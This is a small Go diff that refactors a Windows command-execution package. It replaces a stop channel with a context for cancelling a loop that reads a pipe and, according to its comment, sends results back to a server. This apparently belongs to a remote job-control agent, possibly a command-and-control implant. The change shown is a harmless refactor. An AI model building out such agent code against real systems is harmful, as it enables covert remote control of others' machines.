@@ -3,6 +3,7 @@
 package command
 
 import (
+	"context"
 	"errors"
 	"golang.org/x/sys/windows"
 	"main/config"
@@ -192,7 +193,10 @@ func runNative(path string, args string) error {
 }
 
 // this func read from pipe and send result back to server
-func loopRead(handle windows.Handle, hRPipe windows.Handle, sleepTime int, callbackType int, stopChan chan bool) error {
+func loopRead(handle windows.Handle, hRPipe windows.Handle, sleepTime int, callbackType int, ctx context.Context) error {
+	if ctx == nil {
+		ctx = defaultCtx
+	}
 	event, err := windows.WaitForSingleObject(handle, 0)
 	if err != nil {
 		return err
@@ -208,7 +212,7 @@ func loopRead(handle windows.Handle, hRPipe windows.Handle, sleepTime int, callb
 		}
 		select {
 		// only works in job control
-		case <-stopChan:
+		case <-ctx.Done():
 			return errors.New("job canceled")
 		default:
 			result, err := readPipe(hRPipe)
